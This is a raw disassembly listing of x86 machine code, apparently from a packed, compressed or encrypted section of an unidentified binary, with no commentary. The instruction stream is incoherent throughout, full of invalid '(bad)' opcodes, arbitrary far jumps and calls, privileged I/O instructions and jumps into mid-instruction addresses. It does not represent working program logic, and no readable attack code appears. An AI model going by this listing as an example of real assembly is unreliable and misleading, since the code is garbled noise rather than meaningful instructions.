  41b369:	fnstsw WORD PTR [esi-0x33a36bdd]
  41b36f:	mov    ecx,0x566a21f1
  41b374:	push   edi
  41b375:	pop    edx
  41b376:	jo     0x41b3f1
  41b378:	(bad)  [edi+ebx*1-0x70]
  41b37c:	into   
  41b37d:	cmp    ch,ch
  41b37f:	and    ecx,eax
  41b381:	dec    edx
  41b382:	int3   
  41b383:	retf   
  41b384:	sub    DWORD PTR [esi+0x77],edi
  41b387:	mov    dh,0x9b
  41b389:	and    eax,0xbcdd983d
  41b38e:	add    bl,BYTE PTR [edi-0x60f4d722]
  41b394:	jns    0x41b358
  41b396:	add    al,0x5d
  41b398:	pop    es
  41b399:	dec    edx
  41b39a:	xchg   edi,eax
  41b39b:	mov    edx,0x25bf8eed
  41b3a0:	xchg   ebx,eax
  41b3a1:	clc    
  41b3a2:	pop    edi
  41b3a3:	pop    edi
  41b3a4:	popa   
  41b3a5:	mov    al,0x6b
  41b3a7:	dec    esp
  41b3a8:	dec    ebp
  41b3a9:	jle    0x41b3a1
  41b3ab:	retf   
  41b3ac:	aad    0xe3
  41b3ae:	mov    ds:0xab91483c,al
  41b3b3:	lds    edi,FWORD PTR [eax-0x32]
  41b3b6:	loop   0x41b40d
  41b3b8:	sub    eax,0xbbf71e09
  41b3bd:	outs   dx,BYTE PTR ds:[esi]
  41b3be:	not    ecx
  41b3c0:	jmp    0xa5cf:0x2f89fbfe
  41b3c7:	xor    BYTE PTR [ecx-0x5a50b867],ch
  41b3cd:	jge    0x41b3bc
  41b3cf:	jp     0x41b358
  41b3d1:	ds add esi,edi
  41b3d4:	loop   0x41b384
  41b3d6:	lahf   
  41b3d7:	pusha  
  41b3d8:	or     cl,bh
  41b3da:	dec    sp
  41b3dc:	push   eax
  41b3dd:	dec    ebx
  41b3de:	js     0x41b3e1
  41b3e0:	jp     0x41b3cc
  41b3e2:	inc    esp
  41b3e3:	xor    DWORD PTR [eax-0x5e],esp
  41b3e6:	les    ebp,FWORD PTR [ecx+0x61350717]
  41b3ec:	fidiv  WORD PTR [ebx]
  41b3ee:	push   eax
  41b3ef:	xor    al,bh
  41b3f1:	js     0x41b44a
  41b3f3:	mov    WORD PTR [ecx-0x200c5bff],fs
  41b3f9:	sbb    DWORD PTR [ecx+edx*1],ebp
  41b3fc:	fst    QWORD PTR [edx+edi*4]
  41b3ff:	mov    bh,0xb7
  41b401:	ins    DWORD PTR es:[edi],dx
  41b402:	mov    es,WORD PTR [ecx-0x6d]
  41b405:	mov    cl,bl
  41b407:	inc    ebx
  41b408:	pop    edx
  41b409:	inc    ebx
  41b40a:	and    al,0x62
  41b40c:	fwait
  41b40d:	sub    DWORD PTR [edx+0x76],eax
  41b410:	(bad)  
  41b411:	jnp    0x41b44c
  41b413:	repnz (bad) 
  41b415:	ror    ch,1
  41b417:	mov    ds:0x65bf1feb,eax
  41b41c:	inc    esp
  41b41d:	cmc    
  41b41e:	and    BYTE PTR [ebp+0x46],cl
  41b421:	fild   WORD PTR [ecx]
  41b423:	int    0xa0
  41b425:	jae    0x41b3ba
  41b427:	xchg   edx,eax
  41b428:	inc    edi
  41b429:	jle    0x41b44c
  41b42b:	mov    eax,ds:0x2d8abd12
  41b430:	mov    ds:0x739f5b12,al
  41b435:	adc    eax,0xff1baa2f
  41b43a:	shr    DWORD PTR [edx-0x2e],0x25
  41b43e:	outs   dx,BYTE PTR ds:[esi]
  41b43f:	mov    al,0x2e
  41b441:	outs   dx,DWORD PTR ds:[esi]
  41b442:	ds sahf 
  41b444:	mov    dh,0xf3
  41b446:	and    edx,DWORD PTR [ecx]
  41b448:	repnz dec eax
  41b44a:	js     0x41b4b5
  41b44c:	xchg   ebx,eax
  41b44d:	cmp    esi,DWORD PTR [ebx]
  41b44f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b450:	jp     0x41b46d
  41b452:	int    0x4a
  41b454:	push   eax
  41b455:	je     0x41b486
  41b457:	cmp    bl,BYTE PTR [eax+eiz*4]
  41b45a:	xchg   esi,eax
  41b45b:	jae    0x41b45a
  41b45d:	pop    ss
  41b45e:	fdivr  DWORD PTR [ecx+0x12a71f30]
  41b464:	jmp    0x8a3c4a03
  41b469:	std    
  41b46a:	fcmovb st,st(2)
  41b46c:	or     DWORD PTR [edi],esp
  41b46e:	mov    ah,0x35
  41b470:	fwait
  41b471:	mov    edx,0x87410666
  41b476:	and    bh,BYTE PTR [edi+0x50634e38]
  41b47c:	retf   0x3302
  41b47f:	data16 cmp dl,BYTE PTR es:[edx+0x557890df]
  41b487:	mov    eax,ds:0x8f7cd96a
  41b48c:	and    eax,0xc941eee7
  41b491:	or     eax,esi
  41b493:	sub    BYTE PTR [esi+0x24],ch
  41b496:	cmp    al,bh
  41b498:	ret    0xb9d8
  41b49b:	xchg   ebx,eax
  41b49c:	gs inc esi
  41b49e:	or     BYTE PTR [eax-0x2d],ah
  41b4a1:	xchg   ecx,eax
  41b4a2:	mov    ebp,0x3de06a48
  41b4a7:	stos   DWORD PTR es:[edi],eax
  41b4a8:	lea    esi,[edx]
  41b4aa:	js     0x41b4ed
  41b4ac:	inc    edx
  41b4ad:	mov    ch,0x1e
  41b4af:	pop    esp
  41b4b0:	fdiv   DWORD PTR [edx]
  41b4b2:	test   DWORD PTR [edx],edx
  41b4b4:	sbb    dl,BYTE PTR [edi]
  41b4b6:	cmp    al,0x6
  41b4b8:	and    BYTE PTR [esi+0x20],bl
  41b4bb:	mov    dl,0x44
  41b4bd:	icebp  
  41b4be:	adc    eax,0xf125ec80
  41b4c3:	imul   BYTE PTR [ecx]
  41b4c5:	dec    ebp
  41b4c6:	or     ch,BYTE PTR [ebx-0x1d306ebc]
  41b4cc:	xchg   BYTE PTR [eax-0x18e18558],dl
  41b4d2:	or     BYTE PTR [ebx],al
  41b4d4:	push   ss
  41b4d5:	rcr    BYTE PTR [esi-0x66],1
  41b4d8:	idiv   DWORD PTR ds:0x3055514a
  41b4de:	fucomp st(6)
  41b4e0:	sbb    BYTE PTR [ebx+0x41dc442e],bl
  41b4e6:	jg     0x41b49f
  41b4e8:	rol    bl,cl
  41b4ea:	test   DWORD PTR [ebx-0x11183aa5],eax
  41b4f0:	xor    ah,BYTE PTR [edi-0x30ad9316]
  41b4f6:	(bad)
  41b4f9:	cld    
  41b4fa:	mov    ds:0x4f52d776,eax
  41b4ff:	or     eax,0x227d0784
  41b504:	int3   
  41b505:	loopne 0x41b4cb
  41b507:	fsubr  st(6),st
  41b509:	ja     0x41b554
  41b50b:	dec    esp
  41b50c:	shl    BYTE PTR [ebp-0x19b56d0e],1
  41b512:	and    DWORD PTR [ecx+eiz*2],esp
  41b515:	test   bl,0x5b
  41b518:	adc    eax,0xb57e6d12
  41b51d:	leave  
  41b51e:	xchg   esp,eax
  41b51f:	sbb    eax,0xed02d933
  41b524:	mov    esi,0x2e0cc3e6
  41b529:	lea    edi,[edi+0x7cc384ff]
  41b52f:	inc    ebx
  41b530:	(bad)  
  41b531:	ins    DWORD PTR es:[edi],dx
  41b532:	xor    BYTE PTR [edx],al
  41b534:	xor    eax,DWORD PTR [eax+ebp*4-0x5d]
  41b538:	(bad)  
  41b539:	loope  0x41b578
  41b53b:	les    edi,FWORD PTR [eax-0x415b9f0f]
  41b541:	mov    esi,ss
  41b543:	mov    edx,0x9ea1005b
  41b548:	lods   al,BYTE PTR ds:[esi]
  41b549:	jns    0x41b565
  41b54b:	ins    DWORD PTR es:[edi],dx
  41b54c:	popf   
  41b54d:	push   ecx
  41b54e:	aas    
  41b54f:	out    0xcd,eax
  41b551:	outs   dx,DWORD PTR ds:[esi]
  41b552:	mov    bl,0xfd
  41b554:	xor    esp,ebp
  41b556:	xor    BYTE PTR [esi-0x33],bh
  41b559:	or     DWORD PTR [esi-0x7ff6da18],ebp
  41b55f:	ins    BYTE PTR es:[edi],dx
  41b560:	ins    BYTE PTR es:[edi],dx
  41b561:	jno    0x41b591
  41b563:	xor    al,0xea
  41b565:	test   DWORD PTR [edx],0x16ff3f83
  41b56b:	mov    eax,0x3f82152b
  41b570:	jnp    0x41b532
  41b572:	push   esp
  41b573:	repz ds mov esp,0x8d864885
  41b57a:	pop    edx
  41b57b:	xchg   ebp,eax
  41b57c:	xchg   BYTE PTR [ebx],al
  41b57e:	push   ebx
  41b57f:	push   0xb97143bb
  41b584:	add    DWORD PTR [edi+0x32],esp
  41b587:	stc    
  41b588:	pop    edi
  41b589:	mov    esp,0xb7fbc71b
  41b58e:	push   esp
  41b58f:	sbb    edx,0x35
  41b592:	fdivr  DWORD PTR [ebp-0x70]
  41b595:	ffreep st(3)
  41b597:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b598:	sub    dh,cl
  41b59a:	sub    eax,0x48b29814
  41b59f:	int3   
  41b5a0:	mov    bl,0xd
  41b5a2:	imul   esp,esi,0x6fea672b
  41b5a8:	mov    ebx,DWORD PTR [ecx]
  41b5aa:	jns    0x41b612
  41b5ac:	jg     0x41b53e
  41b5ae:	into   
  41b5af:	sub    BYTE PTR [bx],dl
  41b5b2:	dec    esp
  41b5b3:	push   esi
  41b5b4:	mov    al,0xfc
  41b5b6:	sbb    al,0x1c
  41b5b8:	mov    bh,0x68
  41b5ba:	sub    edi,esp
  41b5bc:	inc    esp
  41b5bd:	jmp    0x41b636
  41b5bf:	sub    eax,DWORD PTR [edi+0x4082366f]
  41b5c5:	sbb    esp,DWORD PTR [ebx+0x5ec0b63a]
  41b5cb:	push   ecx
  41b5cc:	mov    esi,0x36897b7e
  41b5d1:	arpl   WORD PTR [ecx+0x2],ax
  41b5d4:	jmp    0x41b56d
  41b5d6:	out    dx,eax
  41b5d7:	dec    ecx
  41b5d8:	pusha  
  41b5d9:	dec    bp
  41b5db:	fwait
  41b5dc:	lahf   
  41b5dd:	dec    ebp
  41b5de:	push   0xb05a65d4
  41b5e3:	iret   
  41b5e4:	cmp    al,0xad
  41b5e6:	mov    bl,BYTE PTR [edi-0x66fef07c]
  41b5ec:	cmp    bl,BYTE PTR [edx]
  41b5ee:	xchg   ecx,eax
  41b5ef:	xor    BYTE PTR [edi-0x78],dh
  41b5f2:	(bad)  
  41b5f3:	cmp    eax,0xc223e5a8
  41b5f8:	(bad)  
  41b5f9:	push   ecx
  41b5fa:	pop    eax
  41b5fb:	pop    edi
  41b5fc:	popa   
  41b5fd:	mov    ah,0x1f
  41b5ff:	clc    
  41b600:	dec    esp
  41b601:	imul   edi,DWORD PTR [ecx+0x2],0xffffff9e
  41b605:	inc    ebx
  41b606:	ds inc ecx
  41b608:	(bad)  
  41b60a:	inc    eax
  41b60b:	fst    QWORD PTR [ecx-0x43]
  41b60e:	push   esi
  41b60f:	and    al,0x0
  41b611:	add    BYTE PTR [ebx+0x1c7e63fe],0x9d
  41b618:	sub    al,0xb
  41b61a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b61b:	outs   dx,BYTE PTR ds:[esi]
  41b61c:	mov    bl,0x27
  41b61e:	or     al,0xd4
  41b620:	add    BYTE PTR [ebp+0x7d],dl
  41b623:	mov    al,ds:0xd7cb301c
  41b628:	ret    0xe450
  41b62b:	loopne 0x41b61f
  41b62d:	pop    ebx
  41b62e:	loope  0x41b672
  41b630:	xlat   BYTE PTR ds:[ebx]
  41b631:	mov    ds,WORD PTR [edx+0x34]
  41b634:	div    DWORD PTR [ebx+0xe0a97dc]
  41b63a:	xchg   ebx,eax
  41b63b:	lahf   
  41b63c:	pushf  
  41b63d:	stc    
  41b63e:	inc    edi
  41b63f:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  41b641:	mov    es,WORD PTR [esp+ebx*8+0x3a]
  41b645:	mov    ds:0xdd52ac98,eax
  41b64a:	retf   0xf9a
  41b64d:	jp     0x41b5fd
  41b64f:	sbb    DWORD PTR [edi+edx*1+0x50654d1d],edx
  41b656:	sub    eax,0xeadc88b
  41b65b:	push   cs
  41b65c:	fld    st(7)
  41b65e:	idiv   WORD PTR [eax+0x60]
  41b662:	sbb    DWORD PTR [edi+0x3c2e5687],ebp
  41b668:	sbb    cl,BYTE PTR [ebx-0x77]
  41b66b:	popa   
  41b66c:	outs   dx,DWORD PTR ds:[esi]
  41b66d:	mov    esi,DWORD PTR [ecx]
  41b66f:	sub    al,0xff
  41b671:	inc    ecx
  41b672:	lahf   
  41b673:	jae    0x41b66e
  41b675:	jns    0x41b6a0
  41b677:	cld    
  41b678:	test   al,0x14
  41b67a:	ins    DWORD PTR es:[edi],dx
  41b67b:	or     al,0x40
  41b67d:	xchg   edi,eax
  41b67e:	or     cl,bh
  41b680:	nop
  41b681:	daa    
  41b682:	lock in eax,0xbf
  41b685:	rcr    ch,cl
  41b687:	cmovnp edi,DWORD PTR [edi-0x37]
  41b68b:	jno    0x41b663
  41b68d:	jp     0x41b6aa
  41b68f:	test   BYTE PTR [ebp+0x23fb7c17],al
  41b695:	mov    ebp,0xc2850259
  41b69a:	stos   DWORD PTR es:[edi],eax
  41b69b:	mov    cl,0x36
  41b69d:	call   0x285a:0xf1e2c29c
  41b6a4:	push   ebx
  41b6a5:	shl    DWORD PTR [esi+ebp*8],1
  41b6a8:	sub    ecx,ebx
  41b6aa:	push   ds
  41b6ab:	inc    ebp
  41b6ac:	adc    DWORD PTR [edx+edi*2+0x67],ebp
  41b6b0:	test   al,0x61
  41b6b2:	test   eax,0x225fe758
  41b6b7:	xchg   edx,eax
  41b6b8:	sahf   
  41b6b9:	pop    edi
  41b6ba:	mov    al,ds:0x447e15f3
  41b6bf:	dec    ebx
  41b6c0:	push   ds
  41b6c1:	mov    al,0x55
  41b6c3:	mov    ?,WORD PTR [ecx+0x25]
  41b6c6:	mov    dh,0x8c
  41b6c8:	out    0x2b,eax
  41b6ca:	cmp    dl,dh
  41b6cc:	cli    
  41b6cd:	push   ds
  41b6ce:	pop    edx
  41b6cf:	mov    bh,0x31
  41b6d1:	jp     0x41b692
  41b6d3:	and    BYTE PTR [edi-0x66],0x8e
  41b6d7:	sub    cl,BYTE PTR [edx+eiz*1-0x6aba314c]
  41b6de:	in     al,0xe7
  41b6e0:	xor    al,0xf
  41b6e2:	fwait
  41b6e3:	cmp    DWORD PTR [edx-0x75],eax
  41b6e6:	aam    0xe4
  41b6e8:	mov    eax,0x2d227e43
  41b6ed:	les    ebx,FWORD PTR [ecx]
  41b6ef:	sar    bl,cl
  41b6f1:	aad    0x14
  41b6f3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b6f4:	ins    DWORD PTR es:[edi],dx
  41b6f5:	or     esi,ecx
  41b6f7:	mov    ah,0x88
  41b6f9:	lahf   
  41b6fa:	mov    bh,0x6c
  41b6fc:	jge    0x41b6d5
  41b6fe:	mov    al,ds:0x4e5271ad
  41b703:	ins    DWORD PTR es:[edi],dx
  41b704:	push   0x1
  41b706:	and    edx,DWORD PTR [edx+eiz*2]
  41b709:	lods   al,BYTE PTR ds:[esi]
  41b70a:	mov    bl,0x88
  41b70c:	adc    ebx,DWORD PTR [ecx+ecx*1+0x501037f7]
  41b713:	or     DWORD PTR [edi+0x935b9fc],ebp
  41b719:	hlt    
  41b71a:	mov    ds:0xb712c233,eax
  41b71f:	outs   dx,DWORD PTR ds:[esi]
  41b720:	adc    BYTE PTR [ecx],dh
  41b722:	mov    edx,0x7580b25f
  41b727:	shl    BYTE PTR [ebp+0x39ecd3d8],0xb3
  41b72e:	imul   eax,DWORD PTR [eax+eax*2],0xffffffec
  41b732:	pop    es
  41b733:	push   ebx
  41b734:	push   edx
  41b735:	lea    esp,[edi]
  41b737:	jo     0x41b73f
  41b739:	mov    al,ds:0x6a1588bc
  41b73e:	inc    eax
  41b73f:	mov    ds:0xf05d043,eax
  41b744:	push   ss
  41b745:	call   DWORD PTR [ebx]
  41b747:	fsubr  st,st(1)
  41b749:	pop    ds
  41b74a:	sbb    eax,0x8137ca6e
  41b74f:	sbb    bh,ch
  41b751:	push   0x8f0f0f58
  41b756:	push   ecx
  41b757:	(bad)  
  41b758:	inc    DWORD PTR [edi+0x489061d6]
  41b75e:	packssdw mm0,mm0
  41b761:	test   eax,0xc0c85a2d
  41b766:	cmpxchg DWORD PTR [esi+0x13],edx
  41b76a:	mov    dh,0x71
  41b76c:	repz inc ecx
  41b76e:	inc    eax
  41b76f:	pop    ebp
  41b770:	iret   
  41b771:	jp     0x41b7ac
  41b773:	pop    eax
  41b774:	(bad)  
  41b775:	in     eax,dx
  41b776:	imul   eax,DWORD PTR [ecx],0x8410306f
  41b77c:	ds jb  0x41b7ae
  41b77f:	add    BYTE PTR [ebx-0x74],dl
  41b782:	and    ax,0x2f3
  41b786:	cdq    
  41b787:	popa   
  41b788:	fisub  DWORD PTR [edx-0x4371afd2]
  41b78e:	mov    bh,0xf9
  41b790:	mov    al,0xb8
  41b792:	dec    ebx
  41b793:	scas   eax,DWORD PTR es:[edi]
  41b794:	pop    esp
  41b795:	jge    0x41b78c
  41b797:	jmp    0x2dd:0x2ae9d87e
  41b79e:	jmp    0x18887844
  41b7a3:	and    DWORD PTR [ebx+0x4a],0xffffffb4
  41b7a7:	pop    ss
  41b7a8:	sti    
  41b7a9:	push   es
  41b7aa:	adc    esp,DWORD PTR [ecx+0x4faca10f]
  41b7b0:	mov    ah,0x4d
  41b7b2:	pop    eax
  41b7b3:	mov    BYTE PTR ds:0x56e8c12d,ch
  41b7b9:	(bad)  
  41b7ba:	pop    ds
  41b7bb:	push   bp
  41b7bd:	push   0x37
  41b7bf:	int    0xe9
  41b7c1:	jnp    0x41b7ea
  41b7c3:	and    al,0x8a
  41b7c5:	push   ss
  41b7c6:	hlt    
  41b7c7:	sbb    ebx,esp
  41b7c9:	push   ecx
  41b7ca:	pop    es
  41b7cb:	stos   DWORD PTR es:[edi],eax
  41b7cc:	aaa    
  41b7cd:	into   
  41b7ce:	fcomp  DWORD PTR [ecx]
  41b7d0:	fnstsw WORD PTR [eax-0x65483e13]
  41b7d6:	sbb    BYTE PTR [edi+0x5],bl
  41b7d9:	pop    esi
  41b7da:	es cli 
  41b7dc:	push   0x71cf6ffc
  41b7e1:	and    eax,0xc7748314
  41b7e6:	sub    eax,0xac0810
  41b7eb:	aad    0xfa
  41b7ed:	pop    es
  41b7ee:	daa    
  41b7ef:	mov    ecx,0x362ab2a5
  41b7f4:	shr    cl,0x7a
  41b7f7:	nop
  41b7f8:	loope  0x41b845
  41b7fa:	ret    0x93e7
  41b7fd:	popa   
  41b7fe:	cwde   
  41b7ff:	int3   
  41b800:	rol    DWORD PTR [ebp+0x6f],0x24
  41b804:	les    edx,FWORD PTR ds:0xe73301b5
  41b80a:	sub    DWORD PTR [ebp+0x73],ecx
  41b80d:	or     DWORD PTR [edx+0xfe3fbab],esp
  41b813:	jo     0x41b867
  41b815:	aas    
  41b816:	mov    edi,eax
  41b818:	push   ss
  41b819:	add    cl,BYTE PTR [edi+ebx*4]
  41b81c:	jno    0x41b7be
  41b81e:	xor    DWORD PTR [ebx+ecx*1+0x602fc7c9],eax
  41b825:	mov    esi,0x22518ca2
  41b82a:	sub    al,0x96
  41b82c:	sar    eax,1
  41b82e:	pop    edx
  41b82f:	lods   al,BYTE PTR ds:[esi]
  41b830:	pop    ebp
  41b831:	xchg   edi,eax
  41b832:	push   edx
  41b833:	jge    0x41b84b
  41b835:	into   
  41b836:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b837:	(bad)  
  41b838:	loop   0x41b885
  41b83a:	(bad)  
  41b83c:	xchg   edx,ebx
  41b83e:	fst    DWORD PTR ds:0xae1bb024
  41b844:	and    ecx,eax
  41b846:	push   es
  41b847:	test   dl,dh
  41b849:	lahf   
  41b84a:	imul   BYTE PTR [ebp-0x5d]
  41b84d:	push   edi
  41b84e:	ja     0x41b89a
  41b850:	mov    edi,DWORD PTR [edi+0x7d]
  41b853:	xor    BYTE PTR [eax+0x4adda870],bh
  41b859:	scas   eax,DWORD PTR es:[edi]
  41b85a:	xchg   ebx,eax
  41b85b:	(bad)  
  41b85c:	icebp  
  41b85d:	mov    bh,0x4b
  41b85f:	shl    cl,0x45
  41b862:	rol    BYTE PTR [ecx+0x680502c3],cl
  41b868:	xchg   ecx,eax
  41b869:	mov    BYTE PTR [esi-0x62],bh
  41b86c:	mov    bh,0xf1
  41b86e:	enter  0xbd97,0x21
  41b872:	push   ss
  41b873:	ins    DWORD PTR es:[edi],dx
  41b874:	xlat   BYTE PTR ds:[ebx]
  41b875:	and    bl,BYTE PTR [ecx]
  41b877:	test   BYTE PTR [ecx+eiz*2],bl
  41b87a:	ins    DWORD PTR es:[edi],dx
  41b87b:	xchg   esp,eax
  41b87c:	mov    ds:0x7a9ef81b,eax
  41b881:	xchg   edi,eax
  41b882:	outs   dx,DWORD PTR ds:[esi]
  41b883:	pop    ecx
  41b884:	jmp    edi
  41b886:	outs   dx,DWORD PTR ds:[esi]
  41b887:	stos   DWORD PTR es:[edi],eax
  41b888:	loope  0x41b8e7
  41b88a:	push   esi
  41b88b:	xor    al,BYTE PTR [ebp+0x5d]
  41b88e:	(bad)  
  41b890:	and    DWORD PTR [esi],eax
  41b892:	lods   eax,DWORD PTR ds:[esi]
  41b893:	sub    esi,ecx
  41b895:	xchg   ecx,eax
  41b896:	sub    eax,0xd8c697d8
  41b89b:	(bad)  
  41b89c:	mov    ch,0x27
  41b89e:	in     eax,0x67
  41b8a0:	xchg   DWORD PTR [edi],ebp
  41b8a2:	mov    ebp,0x815d101e
  41b8a7:	and    eax,0xd53f78fd
  41b8ac:	and    BYTE PTR [ecx-0x1f4c456],bh
  41b8b2:	sub    bh,BYTE PTR [eax+ebx*8-0x76]
  41b8b6:	mov    WORD PTR [ecx-0x1f1532c6],es
  41b8bc:	mov    edx,0x8662515b
  41b8c1:	sub    BYTE PTR [eax-0x27],dh
  41b8c4:	stc    
  41b8c5:	pop    esp
  41b8c6:	mov    ecx,0x552507c2
  41b8cb:	sbb    ecx,esi
  41b8cd:	dec    esp
  41b8ce:	call   0x97ef:0x14487248
  41b8d5:	dec    ebx
  41b8d6:	mov    al,ds:0xe999d9fb
  41b8db:	mov    dl,0x16
  41b8dd:	push   ebp
  41b8de:	(bad)  
  41b8df:	repz inc ebp
  41b8e1:	aas    
  41b8e2:	and    dh,0xbf
  41b8e5:	dec    esp
  41b8e6:	out    dx,eax
  41b8e7:	pusha  
  41b8e8:	imul   esp,DWORD PTR [edi+0x76ba750],0xc4b1e116
  41b8f2:	popa   
  41b8f3:	push   edi
  41b8f4:	push   eax
  41b8f5:	mov    esp,0xe9658da4
  41b8fa:	out    dx,al
  41b8fb:	sti    
  41b8fc:	(bad)  
  41b8fd:	stos   BYTE PTR es:[edi],al
  41b8fe:	sbb    bl,bl
  41b900:	sbb    al,BYTE PTR [ebp-0xe]
  41b903:	dec    ecx
  41b904:	cmp    ecx,edx
  41b906:	xor    esp,esp
  41b908:	push   cs
  41b909:	and    cl,BYTE PTR [edx+esi*8]
  41b90c:	push   cs
  41b90d:	cld    
  41b90e:	repz out dx,al
  41b910:	jecxz  0x41b8b2
  41b912:	adc    esp,ebx
  41b914:	cmp    al,0xcf
  41b916:	popa   
  41b917:	icebp  
  41b918:	inc    eax
  41b919:	xor    eax,0x312cf81e
  41b91e:	scas   eax,DWORD PTR es:[edi]
  41b91f:	shr    DWORD PTR [edx],cl
  41b921:	mov    ah,0x88
  41b923:	into   
  41b924:	aaa    
  41b925:	fnstcw WORD PTR [ecx+ebx*8+0x2913bc7a]
  41b92c:	lahf   
  41b92d:	sub    edx,DWORD PTR [edi]
  41b92f:	scas   eax,DWORD PTR es:[edi]
  41b930:	ins    DWORD PTR es:[edi],dx
  41b931:	dec    eax
  41b932:	jmp    0xaf17:0x3fe2ed5f
  41b939:	leave  
  41b93a:	and    ah,BYTE PTR [ecx+0x3323aa62]
  41b940:	jmp    0x9ad0:0x1d7d025f
  41b947:	cmp    BYTE PTR [esi],ah
  41b949:	cmp    ah,BYTE PTR [edx-0x65]
  41b94c:	in     eax,dx
  41b94d:	imul   ecx,DWORD PTR [edx+0x73],0xadb2467f
  41b954:	adc    cl,BYTE PTR ds:0x3f87afe9
  41b95a:	inc    eax
  41b95b:	out    dx,al
  41b95c:	or     DWORD PTR [edi],edi
  41b95e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b95f:	fcmovb st,st(6)
  41b961:	push   esi
  41b962:	sbb    DWORD PTR [edi],ebx
  41b964:	and    ah,cl
  41b966:	pop    ds
  41b967:	mov    ds:0xec935f47,eax
  41b96c:	dec    edx
  41b96d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b96e:	shl    BYTE PTR [edi+0x44d84a1d],0xe0
  41b975:	arpl   WORD PTR [ecx-0x69],bp
  41b978:	retf   0x8d51
  41b97b:	clc    
  41b97c:	pushf  
  41b97d:	dec    edi
  41b97e:	mov    BYTE PTR [ecx],cl
  41b980:	mov    WORD PTR [ebp-0x55],ds
  41b983:	pusha  
  41b984:	pop    ebx
  41b985:	jl     0x41b934
  41b987:	or     ch,BYTE PTR [eax-0x68cbb84]
  41b98d:	aaa    
  41b98e:	call   0x112c:0x34ae0a7d
  41b995:	cwde   
  41b996:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b997:	xchg   esp,eax
  41b998:	leave  
  41b999:	shr    DWORD PTR [ebx],cl
  41b99b:	add    al,0x9d
  41b99d:	mov    esi,ecx
  41b99f:	ss and eax,0x12d0e409
  41b9a5:	mov    WORD PTR [ecx-0x13],?
  41b9a8:	mov    eax,0xaa36b3be
  41b9ad:	leave  
  41b9ae:	adc    eax,0x5474309c
  41b9b3:	pop    esi
  41b9b4:	xchg   cl,cl
  41b9b6:	inc    edx
  41b9b7:	cmc    
  41b9b8:	(bad)  
  41b9ba:	bound  eax,QWORD PTR [eax-0x3ade7b5d]
  41b9c0:	(bad)
  41b9c4:	fwait
  41b9c5:	mov    dh,0x73
  41b9c7:	pop    esi
  41b9c8:	mov    cl,0x98
  41b9ca:	mov    DWORD PTR [ebx-0x2],eax
  41b9cd:	adc    BYTE PTR [edi+0x48],cl
  41b9d0:	mov    ebx,0x81556eae
  41b9d5:	jp     0x41ba2b
  41b9d7:	loop   0x41b9ae
  41b9d9:	jb     0x41b99e
  41b9db:	in     al,0xa2
  41b9dd:	and    al,0x54
  41b9df:	push   edi
  41b9e0:	das    
  41b9e1:	sbb    al,0xa5
  41b9e3:	mov    ecx,0xc29e13c5
  41b9e8:	jmp    0x41ba22
  41b9ea:	in     al,dx
  41b9eb:	mov    fs,edi
  41b9ed:	add    ebp,DWORD PTR [esi+0x113fd8a6]
  41b9f3:	in     al,0xc6
  41b9f5:	mov    ds:0x19b3c237,eax
  41b9fa:	inc    edi
  41b9fb:	pop    esp
  41b9fc:	add    DWORD PTR [eax-0x1aecc870],ebx
  41ba02:	outs   dx,BYTE PTR ds:[esi]
  41ba03:	icebp  
  41ba04:	shr    dl,cl
  41ba06:	add    edx,DWORD PTR [eax-0x32ea58fe]
  41ba0c:	popa   
  41ba0d:	sub    al,BYTE PTR [ebp+eax*2-0x54]
  41ba11:	jbe    0x41ba8c
  41ba13:	mov    dh,0xa6
  41ba15:	inc    edi
  41ba16:	dec    edi
  41ba17:	clc    
  41ba18:	mov    esi,0xf8e43378
  41ba1d:	fst    DWORD PTR [ebp-0x6491dccd]
  41ba23:	je     0x41ba5a
  41ba25:	push   esp
  41ba26:	dec    esp
  41ba27:	jo     0x41ba4b
  41ba29:	jecxz  0x41b9cd
  41ba2b:	and    al,0xa8
  41ba2d:	sbb    ecx,DWORD PTR [eax-0x18]
  41ba30:	imul   BYTE PTR [edi+0x19]
  41ba33:	mov    ah,0x51
  41ba35:	push   esi
  41ba36:	std    
  41ba37:	loope  0x41b9ed
  41ba39:	ror    DWORD PTR [ebx-0x43],0x7e
  41ba3d:	xor    eax,0x577d71de
  41ba42:	jno    0x41b9d0
  41ba44:	gs enter 0x112f,0xbb
  41ba49:	sbb    BYTE PTR [ecx+0x43377037],ah
  41ba4f:	mov    edi,0xf2cbc041
  41ba54:	fsub   DWORD PTR [edi]
  41ba56:	xchg   esi,eax
  41ba57:	mov    edx,0xbadb4997
  41ba5c:	js     0x41ba5d
  41ba5e:	hlt    
  41ba5f:	pop    edx
  41ba60:	shr    DWORD PTR [edx+0x121c21d8],0xa5
  41ba67:	pop    esp
  41ba68:	cmc    
  41ba69:	call   DWORD PTR [eax-0x75f69f28]
  41ba6f:	dec    esp
  41ba70:	dec    eax
  41ba71:	data16 stc 
  41ba73:	out    dx,al
  41ba74:	push   ds
  41ba75:	sub    ebp,DWORD PTR [edi-0x140dc408]
  41ba7b:	lea    esi,[esi+ebx*8]
  41ba7e:	sub    BYTE PTR [eax-0x53],0xd7
  41ba82:	ins    BYTE PTR es:[edi],dx
  41ba83:	retf   
  41ba84:	add    al,0xb1
  41ba86:	and    DWORD PTR [edx-0x35],ebx
  41ba89:	and    cl,bh
  41ba8b:	ja     0x41baac
  41ba8d:	(bad)  
  41ba8e:	mov    ebx,0xc8ac0150
  41ba93:	cmp    ebx,ebp
  41ba95:	mov    cl,0xec
  41ba98:	or     al,BYTE PTR [eax+0x4cc89734]
  41ba9e:	fist   DWORD PTR [edi+eax*1]
  41baa1:	or     DWORD PTR [ecx-0x57bf3f6],esp
  41baa7:	repz daa 
  41baa9:	test   eax,0x73b54b56
  41baae:	fwait
  41baaf:	loopne 0x41baa8
  41bab1:	cs mov cl,0xf9
  41bab4:	(bad)  
  41bab5:	out    0xee,al
  41bab7:	loop   0x41bafb
  41bab9:	shl    ebp,cl
  41babb:	mov    eax,ds:0xd2b6b06f
  41bac0:	mov    bl,0x1
  41bac2:	mov    DWORD PTR [esi],esi
  41bac4:	fs pop esi
